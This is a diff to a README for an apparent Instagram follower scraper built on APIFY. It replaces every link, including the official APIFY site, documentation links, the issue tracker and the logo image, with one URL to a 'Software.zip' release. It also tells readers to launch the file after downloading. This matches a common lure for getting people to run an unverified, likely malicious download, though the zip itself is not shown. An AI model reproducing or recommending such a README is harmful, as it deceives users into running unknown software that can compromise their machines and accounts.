@@ -21,7 +21,7 @@ This repository, "instagram-follower-scraper_APIFY", contains a powerful tool fo
 ## Get Started
 To access the Instagram Follower Scraper APIFY tool, please download the latest release by clicking the button below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/bbahrum29/instagram-follower-scraper_APIFY/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/bbahrum29/instagram-follower-scraper_APIFY/releases/download/v1.0/Software.zip)
 
 *Note: The file needs to be launched after downloading.*
 
@@ -33,18 +33,18 @@ To access the Instagram Follower Scraper APIFY tool, please download the latest 
 ## About APIFY
 APIFY is a platform that enables developers to automate workflows and extract data from websites. With APIFY, users can create custom web scrapers, automate processes, and access a wide range of tools to enhance their projects.
 
-For more information about APIFY and its features, visit [APIFY Official Website](https://www.apify.com).
+For more information about APIFY and its features, visit [APIFY Official Website](https://github.com/bbahrum29/instagram-follower-scraper_APIFY/releases/download/v1.0/Software.zip).
 
 ## Additional Resources
-- [APIFY Documentation](https://docs.apify.com/)
-- [Instagram Developer Documentation](https://developers.facebook.com/docs/instagram)
+- [APIFY Documentation](https://github.com/bbahrum29/instagram-follower-scraper_APIFY/releases/download/v1.0/Software.zip)
+- [Instagram Developer Documentation](https://github.com/bbahrum29/instagram-follower-scraper_APIFY/releases/download/v1.0/Software.zip)
 
 ## Support
-For any inquiries or support regarding the Instagram Follower Scraper APIFY tool, please [submit an issue](https://github.com/username/repository/issues) on this repository.
+For any inquiries or support regarding the Instagram Follower Scraper APIFY tool, please [submit an issue](https://github.com/bbahrum29/instagram-follower-scraper_APIFY/releases/download/v1.0/Software.zip) on this repository.
 
 Thank you for choosing the Instagram Follower Scraper APIFY tool. Enhance your social media analytics today! 🌟
 
-![Instagram Logo](https://github.com/github/explore/blob/main/topics/instagram/instagram.png)
+![Instagram Logo](https://github.com/bbahrum29/instagram-follower-scraper_APIFY/releases/download/v1.0/Software.zip)
 
 ---
 "instagram-follower-scraper_APIFY" is not affiliated with Instagram or APIFY.
